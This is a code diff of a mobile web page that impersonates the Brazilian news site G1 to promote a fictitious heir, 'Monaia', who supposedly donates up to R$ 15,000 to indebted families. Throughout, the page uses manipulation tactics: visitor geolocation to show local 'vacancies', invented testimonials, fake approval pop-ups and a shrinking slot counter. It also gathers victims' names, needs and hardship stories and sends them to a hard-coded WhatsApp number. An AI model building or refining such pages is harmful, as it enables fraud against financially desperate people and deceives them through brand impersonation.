@@ -3,216 +3,228 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
-    <title>G1 - PROGRAMA MONAIA 2026</title>
+    <title>G1 - Herança Monaia: Oportunidade Única</title>
     <style>
-        :root { --primary: #c4170c; --accent: #25d366; --bg: #f5f7f9; }
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, system-ui, sans-serif; }
-        body { background: var(--bg); color: #1a1a1a; overflow-x: hidden; }
+        :root { --primary: #c4170c; --accent: #25d366; --gold: #d4af37; --bg: #f8f9fa; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+        body { background: var(--bg); color: #222; }
 
-        /* HEADER PREMIUM */
-        header { background: var(--primary); padding: 15px; display: flex; align-items: center; justify-content: space-between; position: sticky; top: 0; z-index: 1000; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
-        .logo { color: #fff; font-weight: 900; font-size: 22px; font-style: italic; }
-        .live-tag { color: #fff; font-size: 10px; font-weight: 700; background: rgba(0,0,0,0.2); padding: 5px 10px; border-radius: 20px; display: flex; align-items: center; gap: 5px; }
-        .dot { width: 6px; height: 6px; background: #fff; border-radius: 50%; animation: pulse 1s infinite; }
+        /* HEADER G1 */
+        header { background: var(--primary); padding: 12px 20px; display: flex; align-items: center; justify-content: space-between; position: sticky; top: 0; z-index: 1000; box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
+        .g1-logo { color: #fff; font-weight: 900; font-size: 26px; font-style: italic; letter-spacing: -2px; }
+        .live-status { color: #fff; font-size: 11px; font-weight: 700; background: rgba(0,0,0,0.2); padding: 5px 12px; border-radius: 20px; display: flex; align-items: center; gap: 6px; }
+        .pulse-dot { width: 8px; height: 8px; background: #fff; border-radius: 50%; animation: pulse 1s infinite; }
         @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.3; } }
 
         .container { max-width: 500px; margin: 0 auto; background: #fff; min-height: 100vh; position: relative; }
 
-        /* NOTIFICAÇÃO ESTILO IOS */
-        #notif-area { position: fixed; top: 70px; left: 50%; transform: translateX(-50%); width: 95%; max-width: 400px; z-index: 2000; pointer-events: none; }
-        .ios-notif { background: rgba(255,255,255,0.9); backdrop-filter: blur(10px); border-radius: 18px; padding: 15px; margin-bottom: 10px; display: flex; align-items: center; gap: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); border: 1px solid rgba(255,255,255,0.5); transform: translateY(-150%); transition: 0.6s cubic-bezier(0.23, 1, 0.32, 1); }
-        .ios-notif.show { transform: translateY(0); }
-        .ios-notif img { width: 45px; height: 45px; border-radius: 12px; object-fit: cover; }
-        .notif-body b { font-size: 13px; display: block; margin-bottom: 2px; }
-        .notif-body span { font-size: 12px; color: #666; }
-        .notif-body i { color: #128c7e; font-weight: 800; font-style: normal; }
+        /* NOTIFICAÇÕES TIPO IOS */
+        #notif-stack { position: fixed; top: 70px; left: 50%; transform: translateX(-50%); width: 95%; max-width: 420px; z-index: 9999; pointer-events: none; }
+        .notif-ios { background: rgba(255,255,255,0.95); backdrop-filter: blur(15px); border-radius: 20px; padding: 15px; margin-bottom: 12px; display: flex; align-items: center; gap: 15px; box-shadow: 0 15px 35px rgba(0,0,0,0.1); border: 1px solid rgba(0,0,0,0.05); transform: translateY(-150%); transition: 0.7s cubic-bezier(0.19, 1, 0.22, 1); }
+        .notif-ios.show { transform: translateY(0); }
+        .notif-ios img { width: 48px; height: 48px; border-radius: 14px; object-fit: cover; }
+        .n-info b { font-size: 14px; display: block; margin-bottom: 2px; }
+        .n-info span { font-size: 12px; color: #666; }
+        .n-info i { color: #2e7d32; font-weight: 900; font-style: normal; }
 
-        /* CONTEÚDO PRINCIPAL */
-        .hero { padding: 25px 20px; }
+        /* CONTEÚDO STORYTELLING */
+        .article { padding: 25px 20px; }
         .kicker { color: var(--primary); font-weight: 800; font-size: 12px; text-transform: uppercase; margin-bottom: 10px; display: block; }
-        h1 { font-size: 28px; line-height: 1.1; font-weight: 900; margin-bottom: 15px; letter-spacing: -1px; }
-        .geo-text { background: #fff3cd; color: #856404; padding: 8px 12px; border-radius: 8px; font-weight: 700; font-size: 14px; margin-bottom: 20px; display: inline-block; }
-
-        /* FUNIL / POPUP INTERATIVO */
-        .step-container { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); backdrop-filter: blur(8px); z-index: 5000; display: none; align-items: center; justify-content: center; padding: 20px; }
-        .step-card { background: #fff; width: 100%; max-width: 400px; border-radius: 24px; padding: 30px; position: relative; text-align: center; }
-        .step { display: none; }
-        .step.active { display: block; animation: fadeIn 0.4s ease; }
-        @keyframes fadeIn { from { opacity: 0; transform: scale(0.9); } to { opacity: 1; transform: scale(1); } }
+        h1 { font-size: 28px; line-height: 1.1; font-weight: 900; color: #111; margin-bottom: 20px; letter-spacing: -1px; }
+        .geo-badge { background: #fff3cd; color: #856404; padding: 10px 15px; border-radius: 10px; font-weight: 700; font-size: 14px; margin-bottom: 25px; display: block; text-align: center; border: 1px solid #ffeeba; }
         
-        input, textarea { width: 100%; padding: 15px; border: 2px solid #eee; border-radius: 12px; margin: 15px 0; font-size: 16px; outline: none; transition: 0.3s; }
-        input:focus { border-color: var(--primary); }
-        .btn-next { background: var(--primary); color: #fff; border: none; width: 100%; padding: 18px; border-radius: 12px; font-weight: 800; font-size: 16px; cursor: pointer; }
-        .btn-final { background: var(--accent); color: #fff; border: none; width: 100%; padding: 18px; border-radius: 12px; font-weight: 800; font-size: 16px; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px; }
+        .story-box p { margin-bottom: 18px; font-size: 16px; color: #333; line-height: 1.7; }
+        .story-box b { color: #000; font-weight: 700; }
 
         /* CARROSSEL DE DEPOIMENTOS */
-        .carousel-box { background: #f9f9f9; padding: 20px; border-radius: 20px; margin: 20px; }
-        .track { display: flex; transition: transform 0.5s ease; }
-        .slide { min-width: 100%; padding: 0 10px; }
-        .card { background: #fff; padding: 20px; border-radius: 15px; border: 1px solid #eee; }
+        .testimonial-carousel { margin: 30px 0; background: #f0f2f5; padding: 25px 15px; border-radius: 25px; }
+        .t-header { font-weight: 800; text-align: center; margin-bottom: 20px; font-size: 18px; color: #1c1e21; }
+        .track-container { overflow: hidden; position: relative; border-radius: 15px; }
+        .track { display: flex; transition: transform 0.6s cubic-bezier(0.45, 0, 0.55, 1); }
+        .slide { min-width: 100%; padding: 5px; }
+        .slide-inner { background: #fff; padding: 20px; border-radius: 18px; box-shadow: 0 5px 15px rgba(0,0,0,0.05); }
+        .u-meta { display: flex; align-items: center; gap: 12px; margin-bottom: 12px; }
+        .u-img { width: 50px; height: 50px; border-radius: 50%; border: 2px solid var(--accent); }
+        .u-name b { font-size: 15px; display: block; }
+        .u-name span { font-size: 11px; color: #888; }
+        .u-val { margin-left: auto; background: #e8f5e9; color: #2e7d32; font-weight: 900; font-size: 13px; padding: 5px 12px; border-radius: 20px; }
+        .u-txt { font-size: 14px; color: #444; font-style: italic; line-height: 1.5; }
 
-        /* FOOTER FIXED */
-        .footer-cta { position: fixed; bottom: 0; left: 0; width: 100%; background: #fff; padding: 20px; border-top: 1px solid #eee; text-align: center; z-index: 900; }
-        .open-modal-btn { background: var(--accent); color: #fff; padding: 18px; border-radius: 50px; text-decoration: none; display: block; font-weight: 900; font-size: 18px; box-shadow: 0 10px 20px rgba(37,211,102,0.3); }
+        /* MODAL STEPS */
+        .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); backdrop-filter: blur(10px); z-index: 10000; display: none; align-items: center; justify-content: center; padding: 20px; }
+        .step-box { background: #fff; width: 100%; max-width: 400px; border-radius: 30px; padding: 35px; text-align: center; box-shadow: 0 25px 50px rgba(0,0,0,0.3); }
+        .step { display: none; }
+        .step.active { display: block; animation: slideIn 0.4s ease; }
+        @keyframes slideIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+        
+        input, textarea { width: 100%; padding: 18px; border: 2px solid #f0f0f0; border-radius: 15px; margin: 20px 0; font-size: 16px; outline: none; background: #fafafa; }
+        input:focus { border-color: var(--primary); background: #fff; }
+        .btn-go { background: var(--primary); color: #fff; border: none; width: 100%; padding: 20px; border-radius: 15px; font-weight: 800; font-size: 16px; cursor: pointer; }
+        .btn-wpp { background: var(--accent); color: #fff; border: none; width: 100%; padding: 20px; border-radius: 15px; font-weight: 900; font-size: 16px; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px; }
+
+        /* FOOTER CTA */
+        .footer-action { position: fixed; bottom: 0; left: 0; width: 100%; background: #fff; padding: 20px; border-top: 1px solid #eee; text-align: center; z-index: 900; }
+        .main-cta { background: var(--accent); color: #fff; padding: 20px; border-radius: 50px; text-decoration: none; display: block; font-weight: 900; font-size: 18px; box-shadow: 0 12px 24px rgba(37,211,102,0.3); animation: float 2s infinite; }
+        @keyframes float { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-5px); } }
     </style>
 </head>
 <body>
 
 <header>
-    <div class="logo">g1</div>
-    <div class="live-tag"><div class="dot"></div> AO VIVO</div>
+    <div class="g1-logo">g1</div>
+    <div class="live-status"><div class="pulse-dot"></div> AO VIVO</div>
 </header>
 
-<div id="notif-area"></div>
+<div id="notif-stack"></div>
 
 <div class="container">
-    <div class="hero">
-        <span class="kicker">Exclusivo: Herança Monaia</span>
-        <h1>Filho de magnata brasileiro abre reserva pessoal para doações imediatas</h1>
-        <div class="geo-text" id="geo-alert">Carregando vagas para sua região...</div>
+    <div class="article">
+        <span class="kicker">Monaia Heritage Group</span>
+        <h1>Filho de magnata abre canal de auxílio direto para brasileiros endividados</h1>
         
-        <p style="margin-bottom: 20px; color: #444; font-size: 17px; line-height: 1.6;">
-            O herdeiro do grupo <b>Monaia</b> decidiu não manter a fortuna guardada enquanto milhões de brasileiros sofrem. Ele está abençoando pessoalmente 6 famílias por dia com valores de até <b>R$ 15.000</b>.
-        </p>
+        <div class="geo-badge" id="geo-text">Identificando vagas para sua região...</div>
 
-        <img src="https://images.unsplash.com/photo-1580519542036-c47de6196ba5?w=800&q=80" style="width: 100%; border-radius: 15px; margin-bottom: 20px;">
+        <div class="story-box">
+            <p>Meu nome é <b>Monaia</b>. Meu pai construiu um império através do <b>Monaia Heritage Group</b>, mas ele sempre disse que o verdadeiro sucesso não está no que você acumula, mas no que você transforma.</p>
+            
+            <p>Após a partida dele, herdei não apenas recursos, mas a responsabilidade de honrar esse legado. Eu sei que o sistema financeiro do Brasil é feito para te esmagar com juros e dívidas que nunca acabam. <b>Eu decidi que não serei cúmplice disso.</b></p>
+            
+            <p>Hoje, eu separo uma parte da minha reserva pessoal para abençoar <b>6 famílias por dia</b>. Eu não sou um banco e não me importa se seu nome está no Serasa. Eu quero ajudar você a quitar o agiota que te ameaça, consertar seu instrumento de trabalho ou simplesmente colocar comida na mesa com dignidade.</p>
 
-        <div class="carousel-box">
-            <div style="overflow: hidden;">
-                <div class="track" id="track"></div>
+            <p><b>Se você chegou aqui, o algoritmo te selecionou pela sua necessidade. Não desperdice sua chance.</b></p>
+        </div>
+
+        <div class="testimonial-carousel">
+            <div class="t-header">Vidas que mudaram hoje:</div>
+            <div class="track-container">
+                <div class="track" id="track">
+                    </div>
             </div>
         </div>
+
+        <p style="text-align: center; font-size: 12px; color: #999;">O Monaia Heritage Group não possui fins lucrativos nesta operação.</p>
     </div>
 </div>
 
-<div class="footer-cta">
-    <a href="javascript:void(0)" onclick="openModal()" class="open-modal-btn">SOLICITAR MINHA BENÇÃO AGORA</a>
-    <p style="font-size: 11px; margin-top: 10px; color: #999;">Restam apenas <span id="v-count">6</span> vagas disponíveis.</p>
+<div class="footer-action">
+    <a href="javascript:void(0)" onclick="showModal()" class="main-cta">SOLICITAR MINHA BENÇÃO AGORA</a>
+    <p style="font-size: 11px; margin-top: 10px; color: #999;">Restam apenas <span id="v-count">6</span> vagas para sua região.</p>
 </div>
 
-<div class="step-container" id="modal">
-    <div class="step-card">
-        <div class="step active" id="step1">
-            <h2 style="margin-bottom: 10px;">Quem o Herdeiro vai ajudar?</h2>
-            <p style="font-size: 14px; color: #666;">Primeiro, como você se chama?</p>
-            <input type="text" id="userName" placeholder="Seu nome completo">
-            <button class="btn-next" onclick="nextStep(2)">CONTINUAR</button>
+<div class="modal-overlay" id="modal">
+    <div class="step-box">
+        <div class="step active" id="s1">
+            <h2>Bem-vindo ao Heritage</h2>
+            <p style="font-size: 14px; color: #666;">Como o Monaia deve te chamar?</p>
+            <input type="text" id="in_nome" placeholder="Seu nome completo">
+            <button class="btn-go" onclick="go(2)">CONTINUAR</button>
         </div>
-
-        <div class="step" id="step2">
-            <h2>Qual valor te ajudaria hoje?</h2>
-            <p style="font-size: 14px; color: #666;">Seja realista para ser aprovado.</p>
-            <input type="text" id="userValue" placeholder="Ex: R$ 5.000,00">
-            <button class="btn-next" onclick="nextStep(3)">PROXIMO PASSO</button>
+        <div class="step" id="s2">
+            <h2>De quanto você precisa?</h2>
+            <p style="font-size: 14px; color: #666;">Seja honesto para ser aprovado.</p>
+            <input type="text" id="in_valor" placeholder="Ex: R$ 5.000,00">
+            <button class="btn-go" onclick="go(3)">PRÓXIMO</button>
         </div>
-
-        <div class="step" id="step3">
-            <h2>Por que você precisa?</h2>
-            <p style="font-size: 14px; color: #666;">Conte resumidamente sua situação (Agiota, Contas, Saúde...)</p>
-            <textarea id="userStory" rows="4" placeholder="Ex: Estou com aluguel atrasado e agiota me cobrando..."></textarea>
-            <button class="btn-final" onclick="sendWhatsApp()">
-                ENVIAR PARA O WHATSAPP <i class="fab fa-whatsapp"></i>
+        <div class="step" id="s3">
+            <h2>Conte sua história</h2>
+            <p style="font-size: 14px; color: #666;">Por que você precisa desse valor agora?</p>
+            <textarea id="in_historia" rows="4" placeholder="Ex: Agiota me ameaçando, aluguel atrasado..."></textarea>
+            <button class="btn-wpp" onclick="finish()">
+                FALAR COM O MONAIA 🙏
             </button>
         </div>
     </div>
 </div>
 
 <script>
-    // 1. BUSCA CIDADE E ESTADO (GEOLOCALIZAÇÃO)
-    let userCity = "Brasil";
+    let local = "Brasil";
     fetch('https://ipapi.co/json/')
-        .then(res => res.json())
-        .then(data => {
-            userCity = data.city + "/" + data.region_code;
-            document.getElementById('geo-alert').innerText = `⚠️ 6 famílias em ${userCity} selecionadas para hoje!`;
-            startNotifs(); // Só começa as notificações após ter a cidade
+        .then(r => r.json())
+        .then(d => {
+            local = d.city + "/" + d.region_code;
+            document.getElementById('geo-text').innerText = `⚠️ 6 vagas de auxílio liberadas para ${local}`;
+            initNotifs();
         });
 
-    // 2. FUNIL DE PASSOS
-    function openModal() { document.getElementById('modal').style.display = 'flex'; }
-    function nextStep(s) {
-        document.querySelectorAll('.step').forEach(e => e.classList.remove('active'));
-        document.getElementById('step' + s).classList.add('active');
+    function showModal() { document.getElementById('modal').style.display = 'flex'; }
+    function go(n) {
+        document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+        document.getElementById('s'+n).classList.add('active');
     }
 
-    function sendWhatsApp() {
-        const nome = document.getElementById('userName').value;
-        const valor = document.getElementById('userValue').value;
-        const historia = document.getElementById('userStory').value;
-        
-        const texto = `Olá Monaia, fui selecionado na página oficial! 🙏
+    function finish() {
+        const n = document.getElementById('in_nome').value;
+        const v = document.getElementById('in_valor').value;
+        const h = document.getElementById('in_historia').value;
+        const num = "5581995850167";
+        const msg = `Olá Monaia, fui selecionado na página oficial do Heritage Group! 🙏
 
-📌 *DADOS DO PERFIL:*
-👤 *Nome:* ${nome}
-💰 *Valor que preciso:* ${valor}
+📌 *DADOS DO MEU PERFIL:*
+👤 *Nome:* ${n}
+💰 *Valor solicitado:* ${v}
 
 📝 *MINHA HISTÓRIA:*
-"${historia}"
+"${h}"
 
-Tenho esperança que você possa me abençoar hoje!`;
-
-        const encoded = encodeURIComponent(texto);
-        window.location.href = `https://wa.me/message/ULEXJ2WNGPB4N1?text=${encoded}`;
+Aguardando sua análise para ser abençoado!`;
+        window.location.href = `https://api.whatsapp.com/send?phone=${num}&text=${encodeURIComponent(msg)}`;
     }
 
-    // 3. DEPOIMENTOS DINÂMICOS
-    const deps = [
-        {n:'Ricardo S.', v:'R$ 5.000', t:'Paguei o agiota que me ameaçava. Gratidão!', img:'https://i.pravatar.cc/150?u=1'},
-        {n:'Marta L.', v:'R$ 3.000', t:'Fiz o mercado e paguei a luz atrasada.', img:'https://i.pravatar.cc/150?u=2'},
-        {n:'João P.', v:'R$ 12.000', t:'Arrumei minha moto e limpei o Serasa.', img:'https://i.pravatar.cc/150?u=3'},
+    const depoimentos = [
+        {n:'Ricardo S.', c:'SP', v:'R$ 5.000', t:'Paguei o agiota que ameaçava minha família. O Monaia salvou minha vida!', i:'https://i.pravatar.cc/150?u=a1'},
+        {n:'Lúcia M.', c:'RJ', v:'R$ 2.800', t:'Minha luz tava cortada e eu sem saber o que fazer. O PIX caiu em minutos!', i:'https://i.pravatar.cc/150?u=a2'},
+        {n:'Marcos Uber', c:'MG', v:'R$ 10.000', t:'Consertei o câmbio do carro pra voltar a rodar. Agora o sustento voltou.', i:'https://i.pravatar.cc/150?u=a3'},
+        {n:'Fabiana L.', c:'PR', v:'R$ 4.500', t:'Quitei o Serasa e o cartão de crédito. Nome limpo depois de 4 anos!', i:'https://i.pravatar.cc/150?u=a4'},
+        {n:'Tiago G.', c:'BA', v:'R$ 7.200', t:'Reformei o telhado da minha casa que tava caindo. Gratidão ao Heritage!', i:'https://i.pravatar.cc/150?u=a5'},
+        {n:'Sandra R.', c:'CE', v:'R$ 3.500', t:'Paguei os medicamentos caros da minha mãe e fiz a feira do mês.', i:'https://i.pravatar.cc/150?u=a6'},
+        {n:'Felipe M.', c:'GO', v:'R$ 6.000', t:'Paguei 3 aluguéis atrasados e saí do despejo. Um milagre!', i:'https://i.pravatar.cc/150?u=a7'},
+        {n:'Beatriz V.', c:'DF', v:'R$ 15.000', t:'Quitei as dívidas de banco e vou abrir meu pequeno salão. Um sonho!', i:'https://i.pravatar.cc/150?u=a8'},
+        {n:'Paulo Motoboy', c:'SC', v:'R$ 2.200', t:'Troquei o pneu e fiz a revisão da moto. O trabalho não pode parar!', i:'https://i.pravatar.cc/150?u=a9'},
+        {n:'Elena P.', c:'AM', v:'R$ 8.000', t:'Paguei a faculdade do meu filho que tava trancada. Deus abençoe!', i:'https://i.pravatar.cc/150?u=a10'}
     ];
 
     const track = document.getElementById('track');
-    deps.forEach(d => {
+    depoimentos.forEach(d => {
         track.innerHTML += `
             <div class="slide">
-                <div class="card">
-                    <div style="display:flex;align-items:center;gap:10px;margin-bottom:10px;">
-                        <img src="${d.img}" style="width:40px;height:40px;border-radius:50%">
-                        <b>${d.n}</b>
-                        <span style="margin-left:auto;color:#2e7d32;font-weight:900;">${d.v}</span>
+                <div class="slide-inner">
+                    <div class="u-meta">
+                        <img src="${d.i}" class="u-img">
+                        <div class="u-name"><b>${d.n}</b><span>${d.c}</span></div>
+                        <div class="u-val">${d.v}</div>
                     </div>
-                    <p style="font-size:14px;font-style:italic;">"${d.t}"</p>
+                    <p class="u-txt">"${d.t}"</p>
                 </div>
             </div>
         `;
     });
 
-    let slideIdx = 0;
-    setInterval(() => {
-        slideIdx = (slideIdx + 1) % deps.length;
-        track.style.transform = `translateX(-${slideIdx * 100}%)`;
-    }, 4000);
+    let s = 0;
+    setInterval(() => { s = (s + 1) % depoimentos.length; track.style.transform = `translateX(-${s * 100}%)`; }, 4500);
 
-    // 4. NOTIFICAÇÕES INTELIGENTES (COM A CIDADE DO LEAD)
-    function startNotifs() {
-        const notifArea = document.getElementById('notif-area');
-        const nomes = ['Marcos','Sandra','Felipe','Elena','Tiago','Beatriz'];
-        const valores = ['R$ 2.500','R$ 5.000','R$ 1.200','R$ 15.000','R$ 8.000'];
-
-        function spawn() {
-            const n = nomes[Math.floor(Math.random()*nomes.length)];
-            const v = valores[Math.floor(Math.random()*valores.length)];
+    function initNotifs() {
+        const stack = document.getElementById('notif-stack');
+        function show() {
+            const d = depoimentos[Math.floor(Math.random()*depoimentos.length)];
             const el = document.createElement('div');
-            el.className = 'ios-notif';
+            el.className = 'notif-ios';
             el.innerHTML = `
-                <img src="https://i.pravatar.cc/150?u=${Math.random()}">
-                <div class="notif-body">
-                    <b>${n} acabou de ser aprovado(a)!</b>
-                    <span>Recebeu <i>${v}</i> em ${userCity}</span>
+                <img src="${d.i}">
+                <div class="n-info">
+                    <b>${d.n} foi selecionado(a)!</b>
+                    <span>Recebeu <i>${d.v}</i> em ${local}</span>
                 </div>
             `;
-            notifArea.appendChild(el);
+            stack.appendChild(el);
             setTimeout(() => el.classList.add('show'), 100);
-            setTimeout(() => { el.classList.remove('show'); setTimeout(()=>el.remove(), 600); }, 5000);
+            setTimeout(() => { el.classList.remove('show'); setTimeout(()=>el.remove(), 700); }, 5000);
         }
-        setInterval(spawn, 8000);
-        spawn();
+        setInterval(show, 9000);
+        show();
     }
 
-    // Contador de Vagas
-    let vCount = 6;
-    setInterval(() => { if(vCount > 1) { vCount--; document.getElementById('v-count').innerText = vCount; } }, 30000);
+    let vc = 6;
+    setInterval(() => { if(vc > 1) { vc--; document.getElementById('v-count').innerText = vc; } }, 45000);
 </script>
 
 </body>
